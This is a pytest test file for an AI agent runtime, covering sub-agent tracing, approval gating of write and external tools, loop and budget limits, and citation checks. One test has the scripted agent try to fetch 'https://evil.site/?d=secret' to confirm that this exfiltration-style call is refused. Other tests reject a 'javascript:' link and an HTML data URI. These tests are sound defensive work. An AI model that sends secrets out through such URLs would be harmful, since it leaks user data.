import asyncio
import re

from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
from langchain_core.tools import tool
from sqlalchemy import select

from app.agent import policy
from app.agent.policy import EXTERNAL, WRITE
from app.agent.tools import ToolEntry
from app.db import Approval, Message, Run, Span, new_id
from app.tracing import RunContext
from app.turn import ensure_thread, run_turn

from .conftest import tool_call


def is_sub(messages) -> bool:
    return messages[0].content.startswith("You are a focused sub-agent")


def last_tool_messages(messages) -> list[ToolMessage]:
    out = []
    for m in reversed(messages):
        if not isinstance(m, ToolMessage):
            break
        out.append(m)
    return out


async def run(rt, text: str, source: str = "chat", effort: str = "high") -> tuple[RunContext, str]:
    thread = await ensure_thread(rt, None, text)
    ctx = RunContext(run_id=new_id(), source=source, effort=effort)
    output = await asyncio.create_task(run_turn(rt, ctx, thread, text))
    return ctx, output


async def test_nested_parallel_agents_are_traced_as_a_tree(make_runtime):
    def respond(messages):
        if is_sub(messages):
            task = next(m.content for m in messages if isinstance(m, HumanMessage))
            if isinstance(messages[-1], ToolMessage):
                return AIMessage(f"finished {task[-1]} at {messages[-1].content}")
            return AIMessage("", tool_calls=[tool_call("current_time", {})])
        if isinstance(messages[-1], ToolMessage):
            return AIMessage("Both done [t1].")
        return AIMessage("", tool_calls=[tool_call("spawn_agent", {"task": "do A"}, 1),
                                         tool_call("spawn_agent", {"task": "do B"}, 2)])

    rt = await make_runtime(respond)
    ctx, output = await run(rt, "do two things")

    assert output == "Both done [t1]."
    async with rt.db.session() as s:
        spans = {x.id: x for x in (await s.scalars(select(Span).where(Span.run_id == ctx.run_id))).all()}
        run_row = await s.get(Run, ctx.run_id)
        roles = [m.role for m in (await s.scalars(select(Message).where(Message.run_id == ctx.run_id))).all()]
    by_kind = lambda k: [x for x in spans.values() if x.kind == k]  # noqa: E731
    root = next(a for a in by_kind("agent") if a.parent_id is None)
    subs = [a for a in by_kind("agent") if a.parent_id]
    assert len(subs) == 2
    for sub in subs:
        assert spans[sub.parent_id].name == "spawn_agent" and spans[sub.parent_id].parent_id == root.id
        assert sub.meta["depth"] == 1
        times = [t for t in by_kind("tool") if t.parent_id == sub.id]
        assert [t.name for t in times] == ["current_time"] and times[0].status == "ok"
    assert len(by_kind("llm")) == 2 + 2 * 2 + 1  # main twice, each sub twice, then the grounding check
    assert run_row.status == "ok" and run_row.tokens_in == 700 and run_row.checks["invalid_citations"] == []
    assert sorted(roles) == ["assistant", "user"]
    assert rt.memory.remembered  # learned from the turn in the background


async def test_depth_limit_hides_spawn_agent(make_runtime):
    seen_tools = []

    def respond(messages):
        if is_sub(messages):
            return AIMessage("leaf")
        if isinstance(messages[-1], ToolMessage):
            return AIMessage("ok")
        return AIMessage("", tool_calls=[tool_call("spawn_agent", {"task": "x"})])

    rt = await make_runtime(respond, max_depth=1)
    ctx, _ = await run(rt, "go")
    for sp in ctx.spans:
        if sp["kind"] == "llm" and "tools" in sp["input"]:  # not the grounding check
            seen_tools.append(sp["input"]["tools"])
    sub_tools = [t for t in seen_tools if "spawn_agent" not in t]
    assert sub_tools, "the depth-1 sub-agent must not be offered spawn_agent"


def _write_tool_runtime_respond(name):
    def respond(messages):
        if isinstance(messages[-1], ToolMessage):
            return AIMessage(f"result: {messages[-1].content}")
        return AIMessage("", tool_calls=[tool_call(name, {"path": "notes.txt"})])
    return respond


async def test_write_tool_waits_for_approval_and_respects_denial(make_runtime):
    calls = []

    @tool
    def make_file(path: str) -> str:
        """Create a file."""
        calls.append(path)
        return "created"

    rt = await make_runtime(_write_tool_runtime_respond("make_file"), extra_tools=[ToolEntry(make_file, WRITE)],
                            core_tools=["make_file"])
    thread = await ensure_thread(rt, None, "x")
    ctx = RunContext(run_id=new_id())
    task = asyncio.create_task(run_turn(rt, ctx, thread, "make a file"))
    event = await _next_event(ctx, "approval")
    assert policy.decide(event["approval"]["id"], False)
    output = await task
    assert calls == [] and "did not approve" in output
    tool_span = next(s for s in ctx.spans if s["kind"] == "tool")
    assert tool_span["status"] == "denied"
    async with rt.db.session() as s:
        assert (await s.get(Approval, event["approval"]["id"])).status == "denied"

    # approved path runs the tool
    ctx = RunContext(run_id=new_id())
    task = asyncio.create_task(run_turn(rt, ctx, thread, "make a file"))
    event = await _next_event(ctx, "approval")
    policy.decide(event["approval"]["id"], True)
    assert "created" in await task and calls == ["notes.txt"]


async def _next_event(ctx, kind: str) -> dict:
    async def find():
        async for e in ctx.follow(0, keepalive_s=0.05):
            if e and e["type"] == kind:
                return e
    return await asyncio.wait_for(find(), 5)


async def test_evals_never_approve_and_external_tools_never_run(make_runtime):
    sent = []

    @tool
    def send_email(path: str) -> str:
        """Send an email."""
        sent.append(path)
        return "sent"

    @tool
    def make_file(path: str) -> str:
        """Create a file."""
        sent.append(path)
        return "created"

    rt = await make_runtime(_write_tool_runtime_respond("make_file"),
                            extra_tools=[ToolEntry(make_file, WRITE), ToolEntry(send_email, EXTERNAL)],
                            core_tools=["make_file", "send_email"])
    ctx, output = await run(rt, "make a file", source="eval")
    assert sent == [] and "nobody is here to approve" in output

    assert "send_email" not in rt.main_system  # never even listed
    rt2 = await make_runtime(_write_tool_runtime_respond("send_email"),
                             extra_tools=[ToolEntry(send_email, EXTERNAL)], core_tools=["send_email"])
    ctx, output = await run(rt2, "email someone")
    assert sent == [] and "Refused by policy" in output  # even if listed as core, policy refuses it


async def test_load_tools_grows_the_toolset_and_unknown_tools_are_rejected(make_runtime):
    @tool
    def weather(city: str) -> str:
        """Weather for a city."""
        return f"sunny in {city}"

    def respond(messages):
        results = [m for m in messages if isinstance(m, ToolMessage)]
        if not results:
            return AIMessage("", tool_calls=[tool_call("weather", {"city": "Kolkata"}, 0)])
        if len(results) == 1:
            return AIMessage("", tool_calls=[tool_call("load_tools", {"names": ["weather", "nope"]}, 1)])
        if len(results) == 2:
            return AIMessage("", tool_calls=[tool_call("weather", {"city": "Kolkata"}, 2)])
        return AIMessage(results[-1].content)

    rt = await make_runtime(respond, extra_tools=[ToolEntry(weather, "safe")])
    assert "weather [safe]" in rt.main_system  # in the catalog, not bound
    ctx, output = await run(rt, "weather?")
    statuses = [(s["name"], s["status"]) for s in ctx.spans if s["kind"] == "tool"]
    assert statuses == [("weather", "error"), ("load_tools", "ok"), ("weather", "ok")]
    assert output == "[t3] sunny in Kolkata"


async def test_long_tool_output_is_truncated_for_the_model_but_kept_in_trace(make_runtime):
    @tool
    def big() -> str:
        """Big output."""
        return "x" * 10_000

    def respond(messages):
        if isinstance(messages[-1], ToolMessage):
            return AIMessage(str(len(messages[-1].content)))
        return AIMessage("", tool_calls=[tool_call("big", {})])

    rt = await make_runtime(respond, extra_tools=[ToolEntry(big, "safe")], core_tools=["big"], tool_output_chars=500)
    ctx, output = await run(rt, "go")
    assert int(output) < 700
    assert len(next(s for s in ctx.spans if s["name"] == "big")["output"]) == 10_000


async def test_fetch_url_reads_a_long_page_in_numbered_parts_and_finds_lines(make_runtime, monkeypatch):
    lines = [f"item {i:03d}" for i in range(120)] + ["The needle is here", "x" * 1000]  # one line longer than a part
    fetches = []

    async def fake_fetch(url):
        fetches.append(url)
        return "\n".join(lines)

    monkeypatch.setattr("app.agent.tools.fetch_text", fake_fetch)
    url = "https://example.com"

    def respond(messages):
        tms = [m for m in messages if isinstance(m, ToolMessage)]
        if not tms:
            return AIMessage("", tool_calls=[tool_call("fetch_url", {"url": url})])
        more = re.search(r"\[more: start_line=(\d+)", tms[-1].content)
        if more:
            return AIMessage("", tool_calls=[tool_call("fetch_url", {"url": url, "start_line": int(more[1])}, len(tms))])
        if "match" not in tms[-1].content:
            return AIMessage("", tool_calls=[tool_call("fetch_url", {"url": url, "find": "NEEDLE here"}, 99)])
        return AIMessage(tms[-1].content.splitlines()[1])

    rt = await make_runtime(respond, tool_output_chars=700)
    ctx, output = await run(rt, f"read {url}", effort="high")  # the page takes 9 steps; medium allows 8
    assert output == "121: The needle is here"
    parts = [s["output"] for s in ctx.spans if s["name"] == "fetch_url" and "find" not in s["input"]]
    got = [ln.split(": ", 1) for p in parts for ln in p.splitlines() if re.match(r"\d+: ", ln)]
    assert [int(n) for n, _ in got] == list(range(1, 126))  # every line once, in order; the long one in 4 pieces
    assert [t for _, t in got][:121] == lines[:121] and "".join(t for _, t in got[121:]) == "x" * 1000
    assert fetches == [url]  # read on and searched without downloading the page again
    assert "[output truncated" not in "".join(str(s["output"]) for s in ctx.spans if s["name"] == "fetch_url")


def test_fetched_html_keeps_one_line_per_heading_item_and_paragraph():
    from app.agent.tools import _BLOCK, _HEADING, _ITEM, _TAGS

    body = "<nav><a>Home</a></nav><h2>Winter 2027</h2><ul><li>Own Your Intelligence</li><li>AI for City Hall</li></ul>"
    body = _TAGS.sub(" ", _BLOCK.sub("\n", _ITEM.sub("\n- ", _HEADING.sub(lambda m: "\n## ", body))))
    assert [ln.strip() for ln in body.splitlines() if ln.strip()] == [
        "Home", "## Winter 2027", "- Own Your Intelligence", "- AI for City Hall"]


async def test_hallucinated_citation_is_flagged_on_the_run(make_runtime):
    rt = await make_runtime(lambda m: AIMessage("You like chai [m:abcdef01] and won a prize [t9]."))
    ctx, _ = await run(rt, "what do I like?")
    async with rt.db.session() as s:
        checks = (await s.get(Run, ctx.run_id)).checks
    checks.pop("unpriced_models", None)  # depends on whether RIKI_PRICES covers the configured model
    assert checks == {"citations": 2, "invalid_citations": ["t9"], "unsupported": []}


async def test_token_budget_stops_the_loop(make_runtime):
    def respond(messages):
        return AIMessage("", tool_calls=[tool_call("current_time", {}, len(messages))])

    rt = await make_runtime(respond, run_token_budget=1_000)
    ctx, output = await run(rt, "loop forever")
    assert "token budget" in output
    assert ctx.tokens_in + ctx.tokens_out >= 1_000


async def test_repeated_identical_tool_call_is_refused(make_runtime):
    calls = []

    @tool
    def flaky(q: str) -> str:
        """Always fails."""
        calls.append(q)
        raise RuntimeError("down")

    def respond(messages):
        if len(calls) >= 1 and isinstance(messages[-1], ToolMessage) and "already made" in messages[-1].content:
            return AIMessage("search is down")
        return AIMessage("", tool_calls=[tool_call("flaky", {"q": "x"}, len(messages))])

    rt = await make_runtime(respond, extra_tools=[ToolEntry(flaky, "safe")], core_tools=["flaky"])
    _, output = await run(rt, "look it up")
    assert output == "search is down" and calls == ["x"]  # the second identical call never ran



async def test_a_model_ignoring_the_loop_breaker_is_made_to_answer(make_runtime):
    # Bug seen in real use: Kimi re-fetched the same URL five times after being told not to, until the step limit.
    calls = []

    @tool
    def fetch(url: str) -> str:
        """Reads a page."""
        calls.append(url)
        return "page part 1 [more: start_line=40]"

    def respond(messages):
        if any(isinstance(m, HumanMessage) and "repeating refused calls" in m.content for m in messages):
            return AIMessage("here is part 1")
        return AIMessage("", tool_calls=[tool_call("fetch", {"url": "https://a.example"}, len(messages))])

    rt = await make_runtime(respond, extra_tools=[ToolEntry(fetch, "safe")], core_tools=["fetch"])
    ctx, output = await run(rt, "read it")
    assert output == "here is part 1" and calls == ["https://a.example"]
    assert sum(1 for sp in ctx.spans if sp["name"] == "fetch") == 3  # one real call, two refusals, then no tools


async def test_step_limit_ends_with_a_tool_less_answer(make_runtime):
    def respond(messages):
        if any(isinstance(m, HumanMessage) and "Step limit reached" in m.content for m in messages):
            return AIMessage("here is what I found")
        return AIMessage("", tool_calls=[tool_call("current_time", {}, len(messages))])

    rt = await make_runtime(respond, max_steps_per_agent=3)
    _, output = await run(rt, "go on forever")
    assert output == "here is what I found"


async def test_low_effort_works_alone_in_a_few_steps(make_runtime):
    def respond(messages):
        if any(isinstance(m, HumanMessage) and "Step limit reached" in m.content for m in messages):
            return AIMessage(" | ".join(m.content for m in messages if isinstance(m, ToolMessage)))
        return AIMessage("", tool_calls=[tool_call("spawn_agent", {"task": f"t{len(messages)}"}, len(messages))])

    rt = await make_runtime(respond)
    ctx, output = await run(rt, "research everything", effort="low")
    assert ctx.agents_spawned == 0
    assert output.count("Refused") == 3  # 4 steps: 3 rounds of tools, then the answer


async def test_old_tool_results_are_cleared_from_context_but_kept_in_trace(make_runtime):
    @tool
    def page(n: int) -> str:
        """One page."""
        return str(n) * 400

    sent = []

    def respond(messages):
        tms = [m for m in messages if isinstance(m, ToolMessage)]
        sent.append(sum(len(m.content) for m in tms))
        if len(tms) < 6:
            return AIMessage("", tool_calls=[tool_call("page", {"n": len(tms)}, len(tms))])
        if len(tms) == 6:
            assert "cleared from context" in tms[0].content and tms[0].content.startswith("[t1]")
            return AIMessage("", tool_calls=[tool_call("page", {"n": 0}, 99)])  # a cleared call may be repeated
        return AIMessage(tms[-1].content)

    rt = await make_runtime(respond, extra_tools=[ToolEntry(page, "safe")], core_tools=["page"],
                            tool_output_chars=500)
    ctx, output = await run(rt, "read six pages")
    assert output == "[t7] " + "0" * 400
    assert max(sent) <= 4 * 500 + 405  # older results within the budget, plus the latest one whole
    assert all(len(s["output"]) == 400 for s in ctx.spans if s["name"] == "page")


async def test_claims_missing_from_the_evidence_are_flagged_in_the_reply(make_runtime):
    @tool
    def rfs() -> str:
        """The list."""
        return "Winter 2027: Own Your Intelligence; AI for City Hall"

    checked = []

    def verify(messages):
        checked.append(messages[-1].content)
        return AIMessage("Thinking: AI for City Hall is there.\nUNSUPPORTED: AI for Energy\n- UNSUPPORTED: 3 requests in total")

    def respond(messages):
        if isinstance(messages[-1], ToolMessage):
            return AIMessage("3 requests: Own Your Intelligence, AI for City Hall, AI for Energy [t1].")
        return AIMessage("", tool_calls=[tool_call("rfs", {})])

    rt = await make_runtime(respond, verify=verify, extra_tools=[ToolEntry(rfs, "safe")], core_tools=["rfs"])
    ctx, output = await run(rt, "list the winter 2027 requests")
    assert "[t1] Winter 2027: Own Your Intelligence" in checked[0]  # the checker saw the tool's evidence
    assert output.endswith("**Not verified:** I couldn't find these in what I read: AI for Energy; 3 requests in total")
    async with rt.db.session() as s:
        assert (await s.get(Run, ctx.run_id)).checks["unsupported"] == ["AI for Energy", "3 requests in total"]


async def test_a_follow_up_that_looks_nothing_up_is_checked_against_the_last_evidence(make_runtime):
    @tool
    def rfs() -> str:
        """The list."""
        return "Winter 2027: Own Your Intelligence; AI for City Hall"

    checked = []

    def verify(messages):
        checked.append(messages[-1].content)
        return AIMessage("NONE")

    def respond(messages):
        if "how many" in messages[-1].content:
            return AIMessage("Two.")
        if isinstance(messages[-1], ToolMessage):
            return AIMessage("Own Your Intelligence and AI for City Hall [t1].")
        return AIMessage("", tool_calls=[tool_call("rfs", {})])

    rt = await make_runtime(respond, verify=verify, extra_tools=[ToolEntry(rfs, "safe")], core_tools=["rfs"])
    thread = await ensure_thread(rt, None, "rfs")
    for text in ("list them", "how many are there?"):
        await asyncio.create_task(run_turn(rt, RunContext(run_id=new_id()), thread, text))
    assert "Winter 2027: Own Your Intelligence" in checked[1]  # no tool this turn: last turn's evidence


async def test_run_timeout_stops_a_hung_run(make_runtime):
    @tool
    async def hang() -> str:
        """Never returns."""
        await asyncio.sleep(60)
        return "late"

    rt = await make_runtime(lambda m: AIMessage("", tool_calls=[tool_call("hang", {})]),
                            extra_tools=[ToolEntry(hang, "safe")], core_tools=["hang"], run_timeout_s=0.5)
    ctx, output = await run(rt, "wait")
    assert "longer than allowed" in output
    async with rt.db.session() as s:
        assert (await s.get(Run, ctx.run_id)).status == "error"


async def test_empty_stream_from_the_provider_is_retried(make_runtime):
    attempts = []

    def respond(messages):
        attempts.append(1)
        if len(attempts) == 1:
            raise ValueError("No generation chunks were returned")
        return AIMessage("second try worked")

    rt = await make_runtime(respond)
    _, output = await run(rt, "tell me something")
    assert output == "second try worked" and len(attempts) == 2


def test_mcp_tool_schema_with_top_level_anyof_is_flattened():
    from langchain_core.tools import StructuredTool
    from langchain_core.utils.function_calling import convert_to_openai_tool

    async def noop(**kw):
        return "ok"

    schema = {"type": "object", "properties": {"city": {"type": "string"}},
              "anyOf": [{"properties": {"query": {"type": "string"}}, "required": ["query"]},
                        {"properties": {"lat": {"type": "number"}}}]}
    entry = ToolEntry(StructuredTool(name="search", description="d", args_schema=schema, coroutine=noop), "safe")
    params = convert_to_openai_tool(entry.tool)["function"]["parameters"]
    assert not {"anyOf", "oneOf", "allOf"} & params.keys()
    assert set(params["properties"]) == {"city", "query", "lat"}


PIC = "data:image/png;base64,iVBORw0KGgo="


async def test_attached_image_reaches_the_model_and_is_kept(make_runtime):
    seen = []

    def respond(messages):
        seen.append([m for m in messages if isinstance(m, HumanMessage)])
        return AIMessage("a cat")

    rt = await make_runtime(respond)
    thread = await ensure_thread(rt, None, "pic")
    ctx = RunContext(run_id=new_id(), source="chat")
    await asyncio.create_task(run_turn(rt, ctx, thread, "what is this?", images=[PIC]))
    blocks = seen[0][-1].content
    assert blocks[0]["type"] == "text" and "what is this?" in blocks[0]["text"]
    assert blocks[1] == {"type": "image_url", "image_url": {"url": PIC}}
    async with rt.db.session() as s:
        assert (await s.scalar(select(Message).where(Message.run_id == ctx.run_id, Message.role == "user"))).images == [PIC]
        span = await s.scalar(select(Span).where(Span.run_id == ctx.run_id, Span.kind == "agent"))
    assert "base64" not in str(span.input)  # the trace holds the text, not the picture

    ctx2 = RunContext(run_id=new_id(), source="chat")  # a later turn sees only a marker, not the picture again
    await asyncio.create_task(run_turn(rt, ctx2, thread, "and now?"))
    assert any("[1 image(s) attached]" in str(m.content) for m in seen[1])
    assert all(isinstance(m.content, str) for m in seen[1])


def test_chat_input_accepts_pictures_only_in_safe_shapes():
    import pytest
    from pydantic import ValidationError

    from app.main import ChatIn

    assert ChatIn(message="", images=[PIC]).images == [PIC]  # a picture alone is a message
    for bad in ({"message": "", "images": []}, {"message": "x", "images": ["data:text/html;base64,AAAA"]},
                {"message": "x", "images": ["https://example.com/a.png"]}, {"message": "x", "images": [PIC] * 5},
                {"message": "x", "images": ["data:image/png;base64," + "A" * 4_000_000]}):
        with pytest.raises(ValidationError):
            ChatIn(**bad)


async def test_tavily_returns_picture_urls_only_when_asked(monkeypatch):
    from app import search

    asked = []

    async def fake(key, method, path, **kw):
        asked.append(kw["json"]["include_images"])
        return {"results": [{"title": "T", "url": "https://x.test", "content": "c"}],
                "images": ["https://x.test/a.jpg", {"url": "https://x.test/b.jpg"}]}

    monkeypatch.setattr(search, "_call", fake)
    assert "Images" not in await search.search("k", "q")
    out = await search.search("k", "q", images=True)
    assert "- https://x.test/a.jpg" in out and "- https://x.test/b.jpg" in out
    assert asked == [False, True]


def test_links_are_kept_as_absolute_urls_and_junk_is_dropped():
    import httpx

    from app.agent.tools import _abs

    base = httpx.URL("https://shop.test/menu/")
    assert _abs(base, "/item/1") == "https://shop.test/item/1"
    assert _abs(base, "javascript:alert(1)") is None and _abs(base, "data:image/png;base64,AA") is None


def test_memory_lines_get_their_ids_so_they_can_be_cited():
    from types import SimpleNamespace

    from app.turn import with_ids

    text = ("## Memories that may be relevant\n- [fact, 2026-10-27] Riya works at Zerodha.\n"
            "- [fact, 2026-10-01] Likes chai (since 2020)\nRiya works at Zerodha.")
    out = with_ids(text, [SimpleNamespace(content="Riya works at Zerodha.", id="abcdef0123456789"),
                          SimpleNamespace(content="Not in the text", id="ffffffff00000000")])
    assert "- [fact, 2026-10-27] Riya works at Zerodha.  (id: abcdef0123456789)" in out
    assert out.count("(id:") == 1 and out.endswith("\nRiya works at Zerodha.")  # only the memory line, once


async def test_a_pasted_key_is_always_reported_as_removed(make_runtime):
    rt = await make_runtime(lambda m: AIMessage("The card's ready, you're set."))
    _, output = await run(rt, "here is my key [secret removed] please use it")
    assert output.startswith("The key you pasted was removed and not saved.")


async def test_fetch_url_asks_unless_the_url_was_shown_word_for_word(make_runtime, monkeypatch):
    async def fake_fetch(url):
        return "page"

    monkeypatch.setattr("app.agent.tools.fetch_text", fake_fetch)

    def respond(messages):
        if isinstance(messages[-1], ToolMessage):
            return AIMessage(messages[-1].content[:60])
        return AIMessage("", tool_calls=[tool_call("fetch_url", {"url": "https://evil.site/?d=secret"})])

    rt = await make_runtime(respond)
    _, output = await run(rt, "read https://example.com", source="eval")  # no one to approve: refused
    assert "Refused" in output
    _, output = await run(rt, "open https://evil.site/?d=secret please", source="eval")
    assert "fetched" in output


async def test_smart_sub_agents_use_the_smart_model_at_any_effort(make_runtime):
    def respond(messages):
        if is_sub(messages):
            return AIMessage("done")
        if isinstance(messages[-1], ToolMessage):
            return AIMessage("ok")
        return AIMessage("", tool_calls=[tool_call("spawn_agent", {"task": "think", "smart": True})])

    rt = await make_runtime(respond)
    ctx, _ = await run(rt, "hard one", effort="medium")
    assert next(s for s in ctx.spans if s["kind"] == "agent" and s["parent_id"])["meta"]["tier"] == "smart"


async def test_running_out_of_tokens_still_ends_in_an_answer_when_something_was_found(make_runtime):
    def respond(messages):
        if "Token budget reached" in str(messages[-1].content):
            return AIMessage("here is what I found so far")
        return AIMessage("", tool_calls=[tool_call("current_time", {}, len(messages))])

    rt = await make_runtime(respond, run_token_budget=1_000)
    _, output = await run(rt, "research everything")
    assert output == "here is what I found so far"
